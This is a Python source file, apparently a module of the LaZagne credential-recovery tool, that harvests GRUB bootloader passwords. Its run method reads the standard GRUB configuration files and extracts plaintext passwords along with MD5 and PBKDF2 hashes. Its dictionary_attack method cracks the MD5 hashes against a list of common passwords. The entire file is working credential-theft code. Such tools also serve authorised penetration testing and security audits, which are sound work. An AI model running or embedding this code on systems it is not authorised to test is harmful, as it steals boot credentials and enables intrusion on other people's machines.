#!/usr/bin/env python
# -*- coding: utf-8 -*-
import crypt
import os

from lazagne.config.module_info import ModuleInfo
from lazagne.config.dico import get_dic


class Grub(ModuleInfo):

    def __init__(self):
        ModuleInfo.__init__(self, 'grub', 'sysadmin')

    def dictionary_attack(self, crypt_pwd):
        dic = get_dic()  # By default 500 most famous passwords are used for the dictionary attack

        if '$' not in crypt_pwd:
            # Either malformed or old bcrypt password
            return False

        hash_type = crypt_pwd.split("$")[1]
        hash_algo = {
            '1': 'MD5',
        }

        # For Debug information
        for h_type in hash_algo:
            if h_type == hash_type:
                self.debug('[+] Hash type {algo} detected ...'.format(algo=hash_algo[h_type]))

        real_salt = '${hash_type}${salt}$'.format(hash_type=hash_type, salt=crypt_pwd.split("$")[2])

        # -------------------------- Dictionary attack --------------------------
        self.info('Dictionary Attack on the hash !!! ')
        try:
            for word in dic:
                try:
                    crypt_word = crypt.crypt(word, real_salt)
                    if crypt_word == crypt_pwd:
                        return word
                except Exception as e:
                    pass

        except (KeyboardInterrupt, SystemExit):
            self.debug(u'Dictionary attack interrupted')

        return False

    def run(self):
        pwd_found = []
        grub_conf_files = [u'/boot/grub/menu.lst', u'/boot/grub/grub.conf', u'/boot/grub/grub.cfg']
        for grub_file in grub_conf_files:
            if os.path.exists(grub_file):
                conf = open(grub_file).read()
                user, password = '', ''
                if conf.partition('password --md5 ')[1] == 'password --md5 ':
                    hash = conf.partition('password --md5 ')[2].partition('\n')[0]
                    result = self.dictionary_attack(hash)
                    if result:
                        pwd_found.append({
                            'Password': result
                        })
                    else:
                        # No clear text password found - save hash
                        pwd_found.append({
                            'Hash': hash
                        })
                elif conf.partition('password ')[1] == 'password ':
                    password = conf.partition('password ')[2].partition(' ')[2].partition('\n')[0]
                    pwd_found.append({
                        'Login': user,
                        'Password': password
                    })
                elif conf.partition('password_pbkdf2 ')[1] == 'password_pbkdf2 ':
                    user = conf.partition('password_pbkdf2 ')[2].partition(' ')[0]
                    hash = conf.partition('password_pbkdf2 ')[2].partition(' ')[2].partition('\n')[0]
                    pwd_found.append({
                        'Login': user,
                        'Hash': hash
                    })

        return pwd_found